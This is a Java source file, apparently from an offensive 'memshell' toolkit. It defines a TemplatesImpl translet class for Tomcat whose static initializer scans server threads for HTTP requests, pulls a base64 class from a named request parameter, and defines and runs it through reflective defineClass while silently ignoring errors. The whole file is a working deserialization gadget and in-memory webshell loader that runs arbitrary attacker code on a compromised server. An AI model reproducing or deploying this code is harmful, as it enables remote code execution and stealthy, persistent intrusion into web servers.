package org.erosion2020.memshell.classloader;


import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class TemplatesImplTomcat extends AbstractTranslet  {
    public static String loader_pram;
    static {
        try {
            Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");

            for (Thread thread : threads) {
                if (thread == null) continue;

                String name = thread.getName();
                if (name == null || !name.startsWith("http")) continue;

                Object target = getFieldValue(thread, "target");
                if (!(target instanceof Runnable)) continue;

                // handler.global.processors
                Object processors = safeGetFieldChain(target, "this$0.handler.global.processors");
                if (!(processors instanceof java.util.List)) continue;

                for (Object processor : (java.util.List<?>) processors) {
                    Object req = getFieldValue(processor, "req");
                    if (req == null) continue;

                    Object note = req.getClass().getMethod("getNote", int.class).invoke(req, 1);
                    String body = (String) note.getClass().getMethod("getParameter", String.class).invoke(note, loader_pram);
                    if (body == null || body.isEmpty()) continue;

                    // Decode base64 payload
                    byte[] bytes= java.util.Base64.getDecoder().decode(body);
                    // Check if class is already loaded
                    try {
                        Class<?> alreadyLoaded = Thread.currentThread().getContextClassLoader().loadClass(TemplatesImplTomcat.class.getName());
                        continue; // already loaded, skip
                    } catch (ClassNotFoundException ignore) {
                    }

                    // Define class and instantiate
                    ClassLoader cl = Thread.currentThread().getContextClassLoader();
                    java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    defineClass.setAccessible(true);
                    Class<?> definedClass = (Class<?>) defineClass.invoke(cl, bytes, 0, bytes.length);

                    // Try to call init() static method or newInstance
                    try {
                        java.lang.reflect.Method m = definedClass.getDeclaredMethod("init");
                        m.setAccessible(true);
                        m.invoke(null);
                    } catch (NoSuchMethodException e) {
                        definedClass.getDeclaredConstructor().newInstance();
                    }

                }
            }
        } catch (Exception ignore) { }
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        java.lang.reflect.Field f;
        Class<?> c = obj.getClass();
        while (c != null) {
            try {
                f = c.getDeclaredField(fieldName);
                f.setAccessible(true);
                return f.get(obj);
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            }
        }
        throw new NoSuchFieldException("Field " + fieldName + " not found in " + obj.getClass());
    }

    // access to this$0.handler.global.processors
    public static Object safeGetFieldChain(Object obj, String path) {
        try {
            for (String part : path.split("\\.")) {
                obj = getFieldValue(obj, part);
                if (obj == null) return null;
            }
            return obj;
        } catch (Exception e) {
            return null;
        }
    }

    @Override
    public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException {
    }
    @Override
    public void transform(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2) throws TransletException {
    }
}
